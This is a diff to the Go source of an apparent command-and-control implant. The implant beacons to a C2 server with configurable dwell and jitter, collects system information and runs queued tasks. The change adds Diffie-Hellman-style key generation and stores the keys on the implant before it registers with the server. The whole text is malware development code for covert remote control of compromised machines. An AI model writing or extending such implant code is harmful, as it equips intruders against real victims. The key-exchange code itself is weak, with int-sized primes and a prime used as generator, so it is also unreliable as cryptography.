@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/big"
 	"math/rand"
 	"net/http"
 	"time"
@@ -13,9 +14,9 @@ import (
 type ImplantConfig struct {
 	Dwell             string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
 	Jitter            float64 `json:"jitter"`
-	p                 int     `json:"p"`
-	g                 int     `json:"g"`
-	server_public_key int     `json:"server_public_key"`
+	p                 int
+	g                 int
+	server_public_key int
 	//TODO: TIMEOUT, USEPROXY, ENDPOINTS - then fix in listener ImplantConfig as well
 }
 
@@ -26,13 +27,25 @@ type Implant struct {
 	TaskQueue *TaskQueue
 	Results   []Result
 	C2Communicator
+	shared_prime       int
+	shared_generator   int
+	private_key        *big.Int
+	implant_public_key *big.Int
 }
 
 // NewImplant instantiates an Implant, registers it, and wires up its communicator.
 func NewImplant() (*Implant, error) {
+	p := generatePrime()
+	g := generatePrime()
+	priv_key := generatePrivateKey(generatePrime())
+
 	impl := &Implant{
-		SystemInfo: GetSystemInfo(),
-		TaskQueue:  NewTaskQueue(),
+		SystemInfo:         GetSystemInfo(),
+		TaskQueue:          NewTaskQueue(),
+		shared_prime:       p,
+		shared_generator:   g,
+		private_key:        priv_key,
+		implant_public_key: calculatePublicKey(p, priv_key, g),
 	}
 
 	protocol, err := impl.register()
